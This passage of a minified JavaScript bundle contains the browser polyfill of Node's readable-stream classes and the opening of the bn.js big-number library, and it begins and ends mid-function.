            pe(se, de, !1, Re, $, ie, ve);
        return Pe
    }
    function pe(se, de, re, $, ie, ve, ge) {
        de.writelen = $,
        de.writecb = ge,
        de.writing = !0,
        de.sync = !0,
        re ? se._writev(ie, de.onwrite) : se._write(ie, ve, de.onwrite),
        de.sync = !1
    }
    function ye(se, de, re, $, ie) {
        --de.pendingcb,
        re ? (_.nextTick(ie, $),
        _.nextTick(U, se, de),
        se._writableState.errorEmitted = !0,
        se.emit("error", $)) : (ie($),
        se._writableState.errorEmitted = !0,
        se.emit("error", $),
        U(se, de))
    }
    function be(se) {
        se.writing = !1,
        se.writecb = null,
        se.length -= se.writelen,
        se.writelen = 0
    }
    function xe(se, de) {
        var re = se._writableState
          , $ = re.sync
          , ie = re.writecb;
        if (be(re),
        de)
            ye(se, re, $, de, ie);
        else {
            var ve = ce(re);
            !ve && !re.corked && !re.bufferProcessing && re.bufferedRequest && Be(se, re),
            $ ? j(Ae, se, re, ve, ie) : Ae(se, re, ve, ie)
        }
    }
    function Ae(se, de, re, $) {
        re || Ee(se, de),
        de.pendingcb--,
        $(),
        U(se, de)
    }
    function Ee(se, de) {
        de.length === 0 && de.needDrain && (de.needDrain = !1,
        se.emit("drain"))
    }
    function Be(se, de) {
        de.bufferProcessing = !0;
        var re = de.bufferedRequest;
        if (se._writev && re && re.next) {
            var $ = de.bufferedRequestCount
              , ie = new Array($)
              , ve = de.corkedRequestsFree;
            ve.entry = re;
            for (var ge = 0, Re = !0; re; )
                ie[ge] = re,
                re.isBuf || (Re = !1),
                re = re.next,
                ge += 1;
            ie.allBuffers = Re,
            pe(se, de, !0, de.length, ie, "", ve.finish),
            de.pendingcb++,
            de.lastBufferedRequest = null,
            ve.next ? (de.corkedRequestsFree = ve.next,
            ve.next = null) : de.corkedRequestsFree = new M(de),
            de.bufferedRequestCount = 0
        } else {
            for (; re; ) {
                var Pe = re.chunk
                  , Ie = re.encoding
                  , Te = re.callback
                  , Le = de.objectMode ? 1 : Pe.length;
                if (pe(se, de, !1, Le, Pe, Ie, Te),
                re = re.next,
                de.bufferedRequestCount--,
                de.writing)
                    break
            }
            re === null && (de.lastBufferedRequest = null)
        }
        de.bufferedRequest = re,
        de.bufferProcessing = !1
    }
    ne.prototype._write = function(se, de, re) {
        re(new Error("_write() is not implemented"))
    }
    ,
    ne.prototype._writev = null,
    ne.prototype.end = function(se, de, re) {
        var $ = this._writableState;
        typeof se == "function" ? (re = se,
        se = null,
        de = null) : typeof de == "function" && (re = de,
        de = null),
        se != null && this.write(se, de),
        $.corked && ($.corked = 1,
        this.uncork()),
        $.ending || Z(this, $, re)
    }
    ;
    function ce(se) {
        return se.ending && se.length === 0 && se.bufferedRequest === null && !se.finished && !se.writing
    }
    function q(se, de) {
        se._final(function(re) {
            de.pendingcb--,
            re && se.emit("error", re),
            de.prefinished = !0,
            se.emit("prefinish"),
            U(se, de)
        })
    }
    function L(se, de) {
        !de.prefinished && !de.finalCalled && (typeof se._final == "function" ? (de.pendingcb++,
        de.finalCalled = !0,
        _.nextTick(q, se, de)) : (de.prefinished = !0,
        se.emit("prefinish")))
    }
    function U(se, de) {
        var re = ce(de);
        return re && (L(se, de),
        de.pendingcb === 0 && (de.finished = !0,
        se.emit("finish"))),
        re
    }
    function Z(se, de, re) {
        de.ending = !0,
        U(se, de),
        re && (de.finished ? _.nextTick(re) : se.once("finish", re)),
        de.ended = !0,
        se.writable = !1
    }
    function te(se, de, re) {
        var $ = se.entry;
        for (se.entry = null; $; ) {
            var ie = $.callback;
            de.pendingcb--,
            ie(re),
            $ = $.next
        }
        de.corkedRequestsFree.next = se
    }
    return Object.defineProperty(ne.prototype, "destroyed", {
        get: function() {
            return this._writableState === void 0 ? !1 : this._writableState.destroyed
        },
        set: function(se) {
            this._writableState && (this._writableState.destroyed = se)
        }
    }),
    ne.prototype.destroy = K.destroy,
    ne.prototype._undestroy = K.undestroy,
    ne.prototype._destroy = function(se, de) {
        this.end(),
        de(se)
    }
    ,
    _stream_writable
}
var _stream_duplex, hasRequired_stream_duplex;
function require_stream_duplex() {
    if (hasRequired_stream_duplex)
        return _stream_duplex;
    hasRequired_stream_duplex = 1;
    var _ = requireProcessNextickArgs()
      , M = Object.keys || function(K) {
        var Q = [];
        for (var ee in K)
            Q.push(ee);
        return Q
    }
    ;
    _stream_duplex = Y;
    var j = Object.create(requireUtil$2());
    j.inherits = requireInherits_browser();
    var O = require_stream_readable()
      , x = require_stream_writable();
    j.inherits(Y, O);
    for (var w = M(x.prototype), b = 0; b < w.length; b++) {
        var X = w[b];
        Y.prototype[X] || (Y.prototype[X] = x.prototype[X])
    }
    function Y(K) {
        if (!(this instanceof Y))
            return new Y(K);
        O.call(this, K),
        x.call(this, K),
        K && K.readable === !1 && (this.readable = !1),
        K && K.writable === !1 && (this.writable = !1),
        this.allowHalfOpen = !0,
        K && K.allowHalfOpen === !1 && (this.allowHalfOpen = !1),
        this.once("end", F)
    }
    Object.defineProperty(Y.prototype, "writableHighWaterMark", {
        enumerable: !1,
        get: function() {
            return this._writableState.highWaterMark
        }
    });
    function F() {
        this.allowHalfOpen || this._writableState.ended || _.nextTick(V, this)
    }
    function V(K) {
        K.end()
    }
    return Object.defineProperty(Y.prototype, "destroyed", {
        get: function() {
            return this._readableState === void 0 || this._writableState === void 0 ? !1 : this._readableState.destroyed && this._writableState.destroyed
        },
        set: function(K) {
            this._readableState === void 0 || this._writableState === void 0 || (this._readableState.destroyed = K,
            this._writableState.destroyed = K)
        }
    }),
    Y.prototype._destroy = function(K, Q) {
        this.push(null),
        this.end(),
        _.nextTick(Q, K)
    }
    ,
    _stream_duplex
}
var _stream_readable, hasRequired_stream_readable;
function require_stream_readable() {
    if (hasRequired_stream_readable)
        return _stream_readable;
    hasRequired_stream_readable = 1;
    var _ = requireProcessNextickArgs();
    _stream_readable = fe;
    var M = requireIsarray(), j;
    fe.ReadableState = ue,
    requireEvents$1().EventEmitter;
    var O = function(Te, Le) {
        return Te.listeners(Le).length
    }
      , x = requireStreamBrowser()
      , w = requireSafeBuffer().Buffer
      , b = (typeof window < "u" || typeof window < "u" ? window : typeof self < "u" ? self : {}).Uint8Array || function() {}
    ;
    function X(Te) {
        return w.from(Te)
    }
    function Y(Te) {
        return w.isBuffer(Te) || Te instanceof b
    }
    var F = Object.create(requireUtil$2());
    F.inherits = requireInherits_browser();
    var V = requireUtil$3()
      , K = void 0;
    V && V.debuglog ? K = V.debuglog("stream") : K = function() {}
    ;
    var Q = requireBufferList(), ee = requireDestroy(), ae;
    F.inherits(fe, x);
    var ne = ["error", "close", "destroy", "pause", "resume"];
    function oe(Te, Le, Ze) {
        if (typeof Te.prependListener == "function")
            return Te.prependListener(Le, Ze);
        !Te._events || !Te._events[Le] ? Te.on(Le, Ze) : M(Te._events[Le]) ? Te._events[Le].unshift(Ze) : Te._events[Le] = [Ze, Te._events[Le]]
    }
    function ue(Te, Le) {
        j = j || require_stream_duplex(),
        Te = Te || {};
        var Ze = Le instanceof j;
        this.objectMode = !!Te.objectMode,
        Ze && (this.objectMode = this.objectMode || !!Te.readableObjectMode);
        var $e = Te.highWaterMark
          , Ne = Te.readableHighWaterMark
          , qe = this.objectMode ? 16 : 16 * 1024;
        $e || $e === 0 ? this.highWaterMark = $e : Ze && (Ne || Ne === 0) ? this.highWaterMark = Ne : this.highWaterMark = qe,
        this.highWaterMark = Math.floor(this.highWaterMark),
        this.buffer = new Q,
        this.length = 0,
        this.pipes = null,
        this.pipesCount = 0,
        this.flowing = null,
        this.ended = !1,
        this.endEmitted = !1,
        this.reading = !1,
        this.sync = !0,
        this.needReadable = !1,
        this.emittedReadable = !1,
        this.readableListening = !1,
        this.resumeScheduled = !1,
        this.destroyed = !1,
        this.defaultEncoding = Te.defaultEncoding || "utf8",
        this.awaitDrain = 0,
        this.readingMore = !1,
        this.decoder = null,
        this.encoding = null,
        Te.encoding && (ae || (ae = requireString_decoder().StringDecoder),
        this.decoder = new ae(Te.encoding),
        this.encoding = Te.encoding)
    }
    function fe(Te) {
        if (j = j || require_stream_duplex(),
        !(this instanceof fe))
            return new fe(Te);
        this._readableState = new ue(Te,this),
        this.readable = !0,
        Te && (typeof Te.read == "function" && (this._read = Te.read),
        typeof Te.destroy == "function" && (this._destroy = Te.destroy)),
        x.call(this)
    }
    Object.defineProperty(fe.prototype, "destroyed", {
        get: function() {
            return this._readableState === void 0 ? !1 : this._readableState.destroyed
        },
        set: function(Te) {
            this._readableState && (this._readableState.destroyed = Te)
        }
    }),
    fe.prototype.destroy = ee.destroy,
    fe.prototype._undestroy = ee.undestroy,
    fe.prototype._destroy = function(Te, Le) {
        this.push(null),
        Le(Te)
    }
    ,
    fe.prototype.push = function(Te, Le) {
        var Ze = this._readableState, $e;
        return Ze.objectMode ? $e = !0 : typeof Te == "string" && (Le = Le || Ze.defaultEncoding,
        Le !== Ze.encoding && (Te = w.from(Te, Le),
        Le = ""),
        $e = !0),
        he(this, Te, Le, !1, $e)
    }
    ,
    fe.prototype.unshift = function(Te) {
        return he(this, Te, null, !0, !1)
    }
    ;
    function he(Te, Le, Ze, $e, Ne) {
        var qe = Te._readableState;
        if (Le === null)
            qe.reading = !1,
            Be(Te, qe);
        else {
            var Ve;
            Ne || (Ve = ye(qe, Le)),
            Ve ? Te.emit("error", Ve) : qe.objectMode || Le && Le.length > 0 ? (typeof Le != "string" && !qe.objectMode && Object.getPrototypeOf(Le) !== w.prototype && (Le = X(Le)),
            $e ? qe.endEmitted ? Te.emit("error", new Error("stream.unshift() after end event")) : pe(Te, qe, Le, !0) : qe.ended ? Te.emit("error", new Error("stream.push() after EOF")) : (qe.reading = !1,
            qe.decoder && !Ze ? (Le = qe.decoder.write(Le),
            qe.objectMode || Le.length !== 0 ? pe(Te, qe, Le, !1) : L(Te, qe)) : pe(Te, qe, Le, !1))) : $e || (qe.reading = !1)
        }
        return be(qe)
    }
    function pe(Te, Le, Ze, $e) {
        Le.flowing && Le.length === 0 && !Le.sync ? (Te.emit("data", Ze),
        Te.read(0)) : (Le.length += Le.objectMode ? 1 : Ze.length,
        $e ? Le.buffer.unshift(Ze) : Le.buffer.push(Ze),
        Le.needReadable && ce(Te)),
        L(Te, Le)
    }
    function ye(Te, Le) {
        var Ze;
        return !Y(Le) && typeof Le != "string" && Le !== void 0 && !Te.objectMode && (Ze = new TypeError("Invalid non-string/buffer chunk")),
        Ze
    }
    function be(Te) {
        return !Te.ended && (Te.needReadable || Te.length < Te.highWaterMark || Te.length === 0)
    }
    fe.prototype.isPaused = function() {
        return this._readableState.flowing === !1
    }
    ,
    fe.prototype.setEncoding = function(Te) {
        return ae || (ae = requireString_decoder().StringDecoder),
        this._readableState.decoder = new ae(Te),
        this._readableState.encoding = Te,
        this
    }
    ;
    var xe = 8388608;
    function Ae(Te) {
        return Te >= xe ? Te = xe : (Te--,
        Te |= Te >>> 1,
        Te |= Te >>> 2,
        Te |= Te >>> 4,
        Te |= Te >>> 8,
        Te |= Te >>> 16,
        Te++),
        Te
    }
    function Ee(Te, Le) {
        return Te <= 0 || Le.length === 0 && Le.ended ? 0 : Le.objectMode ? 1 : Te !== Te ? Le.flowing && Le.length ? Le.buffer.head.data.length : Le.length : (Te > Le.highWaterMark && (Le.highWaterMark = Ae(Te)),
        Te <= Le.length ? Te : Le.ended ? Le.length : (Le.needReadable = !0,
        0))
    }
    fe.prototype.read = function(Te) {
        K("read", Te),
        Te = parseInt(Te, 10);
        var Le = this._readableState
          , Ze = Te;
        if (Te !== 0 && (Le.emittedReadable = !1),
        Te === 0 && Le.needReadable && (Le.length >= Le.highWaterMark || Le.ended))
            return K("read: emitReadable", Le.length, Le.ended),
            Le.length === 0 && Le.ended ? Re(this) : ce(this),
            null;
        if (Te = Ee(Te, Le),
        Te === 0 && Le.ended)
            return Le.length === 0 && Re(this),
            null;
        var $e = Le.needReadable;
        K("need readable", $e),
        (Le.length === 0 || Le.length - Te < Le.highWaterMark) && ($e = !0,
        K("length less than watermark", $e)),
        Le.ended || Le.reading ? ($e = !1,
        K("reading or ended", $e)) : $e && (K("do read"),
        Le.reading = !0,
        Le.sync = !0,
        Le.length === 0 && (Le.needReadable = !0),
        this._read(Le.highWaterMark),
        Le.sync = !1,
        Le.reading || (Te = Ee(Ze, Le)));
        var Ne;
        return Te > 0 ? Ne = $(Te, Le) : Ne = null,
        Ne === null ? (Le.needReadable = !0,
        Te = 0) : Le.length -= Te,
        Le.length === 0 && (Le.ended || (Le.needReadable = !0),
        Ze !== Te && Le.ended && Re(this)),
        Ne !== null && this.emit("data", Ne),
        Ne
    }
    ;
    function Be(Te, Le) {
        if (!Le.ended) {
            if (Le.decoder) {
                var Ze = Le.decoder.end();
                Ze && Ze.length && (Le.buffer.push(Ze),
                Le.length += Le.objectMode ? 1 : Ze.length)
            }
            Le.ended = !0,
            ce(Te)
        }
    }
    function ce(Te) {
        var Le = Te._readableState;
        Le.needReadable = !1,
        Le.emittedReadable || (K("emitReadable", Le.flowing),
        Le.emittedReadable = !0,
        Le.sync ? _.nextTick(q, Te) : q(Te))
    }
    function q(Te) {
        K("emit readable"),
        Te.emit("readable"),
        re(Te)
    }
    function L(Te, Le) {
        Le.readingMore || (Le.readingMore = !0,
        _.nextTick(U, Te, Le))
    }
    function U(Te, Le) {
        for (var Ze = Le.length; !Le.reading && !Le.flowing && !Le.ended && Le.length < Le.highWaterMark && (K("maybeReadMore read 0"),
        Te.read(0),
        Ze !== Le.length); )
            Ze = Le.length;
        Le.readingMore = !1
    }
    fe.prototype._read = function(Te) {
        this.emit("error", new Error("_read() is not implemented"))
    }
    ,
    fe.prototype.pipe = function(Te, Le) {
        var Ze = this
          , $e = this._readableState;
        switch ($e.pipesCount) {
        case 0:
            $e.pipes = Te;
            break;
        case 1:
            $e.pipes = [$e.pipes, Te];
            break;
        default:
            $e.pipes.push(Te);
            break
        }
        $e.pipesCount += 1,
        K("pipe count=%d opts=%j", $e.pipesCount, Le);
        var Ne = (!Le || Le.end !== !1) && Te !== process$1.stdout && Te !== process$1.stderr
          , qe = Ne ? lt : we;
        $e.endEmitted ? _.nextTick(qe) : Ze.once("end", qe),
        Te.on("unpipe", Ve);
        function Ve(_e, Ce) {
            K("onunpipe"),
            _e === Ze && Ce && Ce.hasUnpiped === !1 && (Ce.hasUnpiped = !0,
            Ke())
        }
        function lt() {
            K("onend"),
            Te.end()
        }
        var nt = Z(Ze);
        Te.on("drain", nt);
        var je = !1;
        function Ke() {
            K("cleanup"),
            Te.removeListener("close", ct),
            Te.removeListener("finish", vt),
            Te.removeListener("drain", nt),
            Te.removeListener("error", mt),
            Te.removeListener("unpipe", Ve),
            Ze.removeListener("end", lt),
            Ze.removeListener("end", we),
            Ze.removeListener("data", We),
            je = !0,
            $e.awaitDrain && (!Te._writableState || Te._writableState.needDrain) && nt()
        }
        var Qe = !1;
        Ze.on("data", We);
        function We(_e) {
            K("ondata"),
            Qe = !1;
            var Ce = Te.write(_e);
            Ce === !1 && !Qe && (($e.pipesCount === 1 && $e.pipes === Te || $e.pipesCount > 1 && Ie($e.pipes, Te) !== -1) && !je && (K("false write response, pause", $e.awaitDrain),
            $e.awaitDrain++,
            Qe = !0),
            Ze.pause())
        }
        function mt(_e) {
            K("onerror", _e),
            we(),
            Te.removeListener("error", mt),
            O(Te, "error") === 0 && Te.emit("error", _e)
        }
        oe(Te, "error", mt);
        function ct() {
            Te.removeListener("finish", vt),
            we()
        }
        Te.once("close", ct);
        function vt() {
            K("onfinish"),
            Te.removeListener("close", ct),
            we()
        }
        Te.once("finish", vt);
        function we() {
            K("unpipe"),
            Ze.unpipe(Te)
        }
        return Te.emit("pipe", Ze),
        $e.flowing || (K("pipe resume"),
        Ze.resume()),
        Te
    }
    ;
    function Z(Te) {
        return function() {
            var Le = Te._readableState;
            K("pipeOnDrain", Le.awaitDrain),
            Le.awaitDrain && Le.awaitDrain--,
            Le.awaitDrain === 0 && O(Te, "data") && (Le.flowing = !0,
            re(Te))
        }
    }
    fe.prototype.unpipe = function(Te) {
        var Le = this._readableState
          , Ze = {
            hasUnpiped: !1
        };
        if (Le.pipesCount === 0)
            return this;
        if (Le.pipesCount === 1)
            return Te && Te !== Le.pipes ? this : (Te || (Te = Le.pipes),
            Le.pipes = null,
            Le.pipesCount = 0,
            Le.flowing = !1,
            Te && Te.emit("unpipe", this, Ze),
            this);
        if (!Te) {
            var $e = Le.pipes
              , Ne = Le.pipesCount;
            Le.pipes = null,
            Le.pipesCount = 0,
            Le.flowing = !1;
            for (var qe = 0; qe < Ne; qe++)
                $e[qe].emit("unpipe", this, {
                    hasUnpiped: !1
                });
            return this
        }
        var Ve = Ie(Le.pipes, Te);
        return Ve === -1 ? this : (Le.pipes.splice(Ve, 1),
        Le.pipesCount -= 1,
        Le.pipesCount === 1 && (Le.pipes = Le.pipes[0]),
        Te.emit("unpipe", this, Ze),
        this)
    }
    ,
    fe.prototype.on = function(Te, Le) {
        var Ze = x.prototype.on.call(this, Te, Le);
        if (Te === "data")
            this._readableState.flowing !== !1 && this.resume();
        else if (Te === "readable") {
            var $e = this._readableState;
            !$e.endEmitted && !$e.readableListening && ($e.readableListening = $e.needReadable = !0,
            $e.emittedReadable = !1,
            $e.reading ? $e.length && ce(this) : _.nextTick(te, this))
        }
        return Ze
    }
    ,
    fe.prototype.addListener = fe.prototype.on;
    function te(Te) {
        K("readable nexttick read 0"),
        Te.read(0)
    }
    fe.prototype.resume = function() {
        var Te = this._readableState;
        return Te.flowing || (K("resume"),
        Te.flowing = !0,
        se(this, Te)),
        this
    }
    ;
    function se(Te, Le) {
        Le.resumeScheduled || (Le.resumeScheduled = !0,
        _.nextTick(de, Te, Le))
    }
    function de(Te, Le) {
        Le.reading || (K("resume read 0"),
        Te.read(0)),
        Le.resumeScheduled = !1,
        Le.awaitDrain = 0,
        Te.emit("resume"),
        re(Te),
        Le.flowing && !Le.reading && Te.read(0)
    }
    fe.prototype.pause = function() {
        return K("call pause flowing=%j", this._readableState.flowing),
        this._readableState.flowing !== !1 && (K("pause"),
        this._readableState.flowing = !1,
        this.emit("pause")),
        this
    }
    ;
    function re(Te) {
        var Le = Te._readableState;
        for (K("flow", Le.flowing); Le.flowing && Te.read() !== null; )
            ;
    }
    fe.prototype.wrap = function(Te) {
        var Le = this
          , Ze = this._readableState
          , $e = !1;
        Te.on("end", function() {
            if (K("wrapped end"),
            Ze.decoder && !Ze.ended) {
                var Ve = Ze.decoder.end();
                Ve && Ve.length && Le.push(Ve)
            }
            Le.push(null)
        }),
        Te.on("data", function(Ve) {
            if (K("wrapped data"),
            Ze.decoder && (Ve = Ze.decoder.write(Ve)),
            !(Ze.objectMode && Ve == null) && !(!Ze.objectMode && (!Ve || !Ve.length))) {
                var lt = Le.push(Ve);
                lt || ($e = !0,
                Te.pause())
            }
        });
        for (var Ne in Te)
            this[Ne] === void 0 && typeof Te[Ne] == "function" && (this[Ne] = function(Ve) {
                return function() {
                    return Te[Ve].apply(Te, arguments)
                }
            }(Ne));
        for (var qe = 0; qe < ne.length; qe++)
            Te.on(ne[qe], this.emit.bind(this, ne[qe]));
        return this._read = function(Ve) {
            K("wrapped _read", Ve),
            $e && ($e = !1,
            Te.resume())
        }
        ,
        this
    }
    ,
    Object.defineProperty(fe.prototype, "readableHighWaterMark", {
        enumerable: !1,
        get: function() {
            return this._readableState.highWaterMark
        }
    }),
    fe._fromList = $;
    function $(Te, Le) {
        if (Le.length === 0)
            return null;
        var Ze;
        return Le.objectMode ? Ze = Le.buffer.shift() : !Te || Te >= Le.length ? (Le.decoder ? Ze = Le.buffer.join("") : Le.buffer.length === 1 ? Ze = Le.buffer.head.data : Ze = Le.buffer.concat(Le.length),
        Le.buffer.clear()) : Ze = ie(Te, Le.buffer, Le.decoder),
        Ze
    }
    function ie(Te, Le, Ze) {
        var $e;
        return Te < Le.head.data.length ? ($e = Le.head.data.slice(0, Te),
        Le.head.data = Le.head.data.slice(Te)) : Te === Le.head.data.length ? $e = Le.shift() : $e = Ze ? ve(Te, Le) : ge(Te, Le),
        $e
    }
    function ve(Te, Le) {
        var Ze = Le.head
          , $e = 1
          , Ne = Ze.data;
        for (Te -= Ne.length; Ze = Ze.next; ) {
            var qe = Ze.data
              , Ve = Te > qe.length ? qe.length : Te;
            if (Ve === qe.length ? Ne += qe : Ne += qe.slice(0, Te),
            Te -= Ve,
            Te === 0) {
                Ve === qe.length ? (++$e,
                Ze.next ? Le.head = Ze.next : Le.head = Le.tail = null) : (Le.head = Ze,
                Ze.data = qe.slice(Ve));
                break
            }
            ++$e
        }
        return Le.length -= $e,
        Ne
    }
    function ge(Te, Le) {
        var Ze = w.allocUnsafe(Te)
          , $e = Le.head
          , Ne = 1;
        for ($e.data.copy(Ze),
        Te -= $e.data.length; $e = $e.next; ) {
            var qe = $e.data
              , Ve = Te > qe.length ? qe.length : Te;
            if (qe.copy(Ze, Ze.length - Te, 0, Ve),
            Te -= Ve,
            Te === 0) {
                Ve === qe.length ? (++Ne,
                $e.next ? Le.head = $e.next : Le.head = Le.tail = null) : (Le.head = $e,
                $e.data = qe.slice(Ve));
                break
            }
            ++Ne
        }
        return Le.length -= Ne,
        Ze
    }
    function Re(Te) {
        var Le = Te._readableState;
        if (Le.length > 0)
            throw new Error('"endReadable()" called on non-empty stream');
        Le.endEmitted || (Le.ended = !0,
        _.nextTick(Pe, Le, Te))
    }
    function Pe(Te, Le) {
        !Te.endEmitted && Te.length === 0 && (Te.endEmitted = !0,
        Le.readable = !1,
        Le.emit("end"))
    }
    function Ie(Te, Le) {
        for (var Ze = 0, $e = Te.length; Ze < $e; Ze++)
            if (Te[Ze] === Le)
                return Ze;
        return -1
    }
    return _stream_readable
}
var _stream_transform, hasRequired_stream_transform;
function require_stream_transform() {
    if (hasRequired_stream_transform)
        return _stream_transform;
    hasRequired_stream_transform = 1,
    _stream_transform = O;
    var _ = require_stream_duplex()
      , M = Object.create(requireUtil$2());
    M.inherits = requireInherits_browser(),
    M.inherits(O, _);
    function j(b, X) {
        var Y = this._transformState;
        Y.transforming = !1;
        var F = Y.writecb;
        if (!F)
            return this.emit("error", new Error("write callback called multiple times"));
        Y.writechunk = null,
        Y.writecb = null,
        X != null && this.push(X),
        F(b);
        var V = this._readableState;
        V.reading = !1,
        (V.needReadable || V.length < V.highWaterMark) && this._read(V.highWaterMark)
    }
    function O(b) {
        if (!(this instanceof O))
            return new O(b);
        _.call(this, b),
        this._transformState = {
            afterTransform: j.bind(this),
            needTransform: !1,
            transforming: !1,
            writecb: null,
            writechunk: null,
            writeencoding: null
        },
        this._readableState.needReadable = !0,
        this._readableState.sync = !1,
        b && (typeof b.transform == "function" && (this._transform = b.transform),
        typeof b.flush == "function" && (this._flush = b.flush)),
        this.on("prefinish", x)
    }
    function x() {
        var b = this;
        typeof this._flush == "function" ? this._flush(function(X, Y) {
            w(b, X, Y)
        }) : w(this, null, null)
    }
    O.prototype.push = function(b, X) {
        return this._transformState.needTransform = !1,
        _.prototype.push.call(this, b, X)
    }
    ,
    O.prototype._transform = function(b, X, Y) {
        throw new Error("_transform() is not implemented")
    }
    ,
    O.prototype._write = function(b, X, Y) {
        var F = this._transformState;
        if (F.writecb = Y,
        F.writechunk = b,
        F.writeencoding = X,
        !F.transforming) {
            var V = this._readableState;
            (F.needTransform || V.needReadable || V.length < V.highWaterMark) && this._read(V.highWaterMark)
        }
    }
    ,
    O.prototype._read = function(b) {
        var X = this._transformState;
        X.writechunk !== null && X.writecb && !X.transforming ? (X.transforming = !0,
        this._transform(X.writechunk, X.writeencoding, X.afterTransform)) : X.needTransform = !0
    }
    ,
    O.prototype._destroy = function(b, X) {
        var Y = this;
        _.prototype._destroy.call(this, b, function(F) {
            X(F),
            Y.emit("close")
        })
    }
    ;
    function w(b, X, Y) {
        if (X)
            return b.emit("error", X);
        if (Y != null && b.push(Y),
        b._writableState.length)
            throw new Error("Calling transform done when ws.length != 0");
        if (b._transformState.transforming)
            throw new Error("Calling transform done when still transforming");
        return b.push(null)
    }
    return _stream_transform
}
var _stream_passthrough, hasRequired_stream_passthrough;
function require_stream_passthrough() {
    if (hasRequired_stream_passthrough)
        return _stream_passthrough;
    hasRequired_stream_passthrough = 1,
    _stream_passthrough = j;
    var _ = require_stream_transform()
      , M = Object.create(requireUtil$2());
    M.inherits = requireInherits_browser(),
    M.inherits(j, _);
    function j(O) {
        if (!(this instanceof j))
            return new j(O);
        _.call(this, O)
    }
    return j.prototype._transform = function(O, x, w) {
        w(null, O)
    }
    ,
    _stream_passthrough
}
var hasRequiredReadableBrowser;
function requireReadableBrowser() {
    return hasRequiredReadableBrowser || (hasRequiredReadableBrowser = 1,
    function(_, M) {
        M = _.exports = require_stream_readable(),
        M.Stream = M,
        M.Readable = M,
        M.Writable = require_stream_writable(),
        M.Duplex = require_stream_duplex(),
        M.Transform = require_stream_transform(),
        M.PassThrough = require_stream_passthrough()
    }(readableBrowser, readableBrowser.exports)),
    readableBrowser.exports
}
var sign = {
    exports: {}
}, bn$9 = {
    exports: {}
}, bn$8 = bn$9.exports, hasRequiredBn$4;
function requireBn$4() {
    return hasRequiredBn$4 || (hasRequiredBn$4 = 1,
    function(_) {
        (function(M, j) {
            function O(L, U) {
                if (!L)
                    throw new Error(U || "Assertion failed")
            }
            function x(L, U) {
                L.super_ = U;
                var Z = function() {};
                Z.prototype = U.prototype,
                L.prototype = new Z,
                L.prototype.constructor = L
            }
            function w(L, U, Z) {
                if (w.isBN(L))
                    return L;
                this.negative = 0,
                this.words = null,
                this.length = 0,
                this.red = null,
                L !== null && ((U === "le" || U === "be") && (Z = U,
                U = 10),
                this._init(L || 0, U || 10, Z || "be"))
            }
            typeof M == "object" ? M.exports = w : j.BN = w,
            w.BN = w,
            w.wordSize = 26;
            var b;
            try {
                typeof window < "u" && typeof window.Buffer < "u" ? b = window.Buffer : b = requireDist$4().Buffer
            } catch {}
            w.isBN = function(U) {
                return U instanceof w ? !0 : U !== null && typeof U == "object" && U.constructor.wordSize === w.wordSize && Array.isArray(U.words)
            }
            ,
            w.max = function(U, Z) {
                return U.cmp(Z) > 0 ? U : Z
            }
            ,
            w.min = function(U, Z) {
                return U.cmp(Z) < 0 ? U : Z
            }
            ,
            w.prototype._init = function(U, Z, te) {
                if (typeof U == "number")
                    return this._initNumber(U, Z, te);
                if (typeof U == "object")
                    return this._initArray(U, Z, te);
                Z === "hex" && (Z = 16),
                O(Z === (Z | 0) && Z >= 2 && Z <= 36),
                U = U.toString().replace(/\s+/g, "");
                var se = 0;
                U[0] === "-" && (se++,
                this.negative = 1),
                se < U.length && (Z === 16 ? this._parseHex(U, se, te) : (this._parseBase(U, Z, se),
                te === "le" && this._initArray(this.toArray(), Z, te)))
            }
            ,
            w.prototype._initNumber = function(U, Z, te) {
                U < 0 && (this.negative = 1,
                U = -U),
                U < 67108864 ? (this.words = [U & 67108863],
                this.length = 1) : U < 4503599627370496 ? (this.words = [U & 67108863, U / 67108864 & 67108863],
                this.length = 2) : (O(U < 9007199254740992),
                this.words = [U & 67108863, U / 67108864 & 67108863, 1],
                this.length = 3),
                te === "le" && this._initArray(this.toArray(), Z, te)
            }
            ,
            w.prototype._initArray = function(U, Z, te) {
                if (O(typeof U.length == "number"),
                U.length <= 0)
                    return this.words = [0],
                    this.length = 1,
                    this;
                this.length = Math.ceil(U.length / 3),
                this.words = new Array(this.length);
                for (var se = 0; se < this.length; se++)
                    this.words[se] = 0;
                var de, re, $ = 0;
                if (te === "be")
                    for (se = U.length - 1,
                    de = 0; se >= 0; se -= 3)
                        re = U[se] | U[se - 1] << 8 | U[se - 2] << 16,
                        this.words[de] |= re << $ & 67108863,
                        this.words[de + 1] = re >>> 26 - $ & 67108863,
                        $ += 24,
                        $ >= 26 && ($ -= 26,
                        de++);
                else if (te === "le")
                    for (se = 0,
                    de = 0; se < U.length; se += 3)
                        re = U[se] | U[se + 1] << 8 | U[se + 2] << 16,
                        this.words[de] |= re << $ & 67108863,
                        this.words[de + 1] = re >>> 26 - $ & 67108863,
                        $ += 24,
                        $ >= 26 && ($ -= 26,
                        de++);
                return this._strip()
            }
            ;
            function X(L, U) {
                var Z = L.charCodeAt(U);
                if (Z >= 48 && Z <= 57)
                    return Z - 48;
                if (Z >= 65 && Z <= 70)
                    return Z - 55;
                if (Z >= 97 && Z <= 102)
                    return Z - 87;
                O(!1, "Invalid character in " + L)
            }
            function Y(L, U, Z) {
                var te = X(L, Z);
                return Z - 1 >= U && (te |= X(L, Z - 1) << 4),
                te
            }
            w.prototype._parseHex = function(U, Z, te) {
                this.length = Math.ceil((U.length - Z) / 6),
                this.words = new Array(this.length);
                for (var se = 0; se < this.length; se++)
                    this.words[se] = 0;
                var de = 0, re = 0, $;
                if (te === "be")
                    for (se = U.length - 1; se >= Z; se -= 2)
                        $ = Y(U, Z, se) << de,
                        this.words[re] |= $ & 67108863,
                        de >= 18 ? (de -= 18,
                        re += 1,
                        this.words[re] |= $ >>> 26) : de += 8;
                else {
                    var ie = U.length - Z;
                    for (se = ie % 2 === 0 ? Z + 1 : Z; se < U.length; se += 2)
                        $ = Y(U, Z, se) << de,
                        this.words[re] |= $ & 67108863,
                        de >= 18 ? (de -= 18,
                        re += 1,
                        this.words[re] |= $ >>> 26) : de += 8
                }
                this._strip()
            }
            ;
            function F(L, U, Z, te) {
                for (var se = 0, de = 0, re = Math.min(L.length, Z), $ = U; $ < re; $++) {
                    var ie = L.charCodeAt($) - 48;
                    se *= te,
                    ie >= 49 ? de = ie - 49 + 10 : ie >= 17 ? de = ie - 17 + 10 : de = ie,
                    O(ie >= 0 && de < te, "Invalid character"),
                    se += de
                }
                return se
            }
            w.prototype._parseBase = function(U, Z, te) {
                this.words = [0],
                this.length = 1;
